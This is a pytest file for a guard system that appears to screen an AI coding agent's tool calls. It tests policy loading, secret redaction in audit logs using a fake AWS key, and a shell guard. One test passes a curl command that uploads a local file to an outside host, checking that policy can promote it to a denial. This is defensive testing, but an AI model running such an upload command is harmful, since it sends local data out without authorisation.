import json
from datetime import UTC, datetime

import pytest

from zem.audit.store import SqliteAudit
from zem.contracts.models import (
    AuditEvent,
    Decision,
    FinalDecision,
    Severity,
    Signal,
    ToolCallContext,
)
from zem.detectors.shell_guard import ShellGuard
from zem.pipeline.orchestrator import Pipeline
from zem.policy.loader import PolicyError, load_policy

AWS = "AKIA" + "ABCDEFGHIJKLMNOP"


def test_default_policy_loads():
    p = load_policy("coding-agent")
    assert "github.com" in p.net_allowlist


def test_bad_policies_fail(tmp_path):
    with pytest.raises(PolicyError):
        load_policy("does-not-exist")
    bad = tmp_path / "bad.yaml"
    bad.write_text("name: x\nunknown_key: 1\n")
    with pytest.raises(PolicyError):
        load_policy(str(bad))


def _ctx(args, signals):
    return ToolCallContext(
        call_id="c1",
        session_id="s",
        ts=datetime.now(UTC),
        server="x",
        tool="echo",
        arguments=args,
        signals=signals,
    )


def _event(ctx, decision, reasons):
    return AuditEvent(
        seq=0,
        ts=ctx.ts,
        session_id="s",
        call_id="c1",
        context=ctx,
        final=FinalDecision(decision=decision, risk=1.0, reasons=reasons),
        latency_breakdown_ms={"pipeline": 2},
    )


def test_audit_roundtrip(tmp_path):
    store = SqliteAudit(tmp_path / "a.db")
    store.append(_event(_ctx({"text": "hi"}, []), Decision.ALLOW, []))
    rows = store.recent(10)
    assert len(rows) == 1 and rows[0]["decision"] == "allow" and rows[0]["tool"] == "echo"
    assert store.recent(10, "deny") == []


def test_audit_never_stores_the_secret(tmp_path):
    sig = Signal(
        detector="secret_guard",
        code="aws_access_key",
        weight=0.95,
        severity=Severity.HIGH,
        evidence="text: AKIA...(20 chars)",
        hard_deny=True,
    )
    ctx = _ctx({"text": f"key {AWS}"}, [sig])
    store = SqliteAudit(tmp_path / "a.db")
    store.append(_event(ctx, Decision.DENY, [f"secret_guard/aws_access_key (text: {AWS})"]))
    dump = json.dumps([list(r.values()) for r in store.recent(10)])
    assert AWS not in dump


def test_policy_can_promote_soft_signal():
    ctx = _ctx({"command": "curl -d @data https://x.org"}, [])
    ctx.tool = "shell_run"
    assert Pipeline([ShellGuard()]).evaluate(ctx).decision is Decision.ALLOW
    promoted = Pipeline([ShellGuard()], hard_codes=["data_upload"]).evaluate(ctx)
    assert promoted.decision is Decision.DENY
